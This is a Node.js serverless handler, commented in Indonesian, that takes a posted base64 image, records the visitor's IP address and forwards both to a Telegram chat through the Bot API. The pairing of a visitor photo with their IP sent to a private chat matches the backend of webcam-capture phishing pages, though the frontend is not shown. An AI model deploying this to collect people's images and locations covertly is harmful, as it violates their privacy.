import FormData from 'form-data';
import fetch from 'node-fetch';
import { Buffer } from 'buffer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  try {
    const body = req.body;
    const dataUrl = body?.image;
    if (!dataUrl) return res.status(400).json({ ok: false, error: 'No image' });

    // ambil IP pengunjung
    const xff = req.headers['x-forwarded-for'] || '';
    const clientIp = xff.split(',')[0].trim() || req.socket.remoteAddress || '';

    // decode base64 dataURL
    const matches = dataUrl.match(/^data:(.+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false, error: 'Invalid dataURL' });
    const mime = matches[1];
    const base64 = matches[2];
    const buffer = Buffer.from(base64, 'base64');

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ ok: false, error: 'Bot token / chat id not configured' });
    }

    // siapkan form-data untuk Telegram API
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'photo.jpg', contentType: mime });
    form.append('caption', `IP pengunjung: ${clientIp}`);

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: form.getHeaders(),
      body: form
    });

    const tgJson = await tgRes.json();

    if (!tgRes.ok) {
      return res.status(502).json({ ok: false, error: 'Telegram error', detail: tgJson });
    }

    return res.status(200).json({ ok: true, telegram: tgJson });
  } catch (err) {
    console.error('upload error', err);
    return res.status(500).json({ ok: false, error: err?.message || String(err) });
  }
}
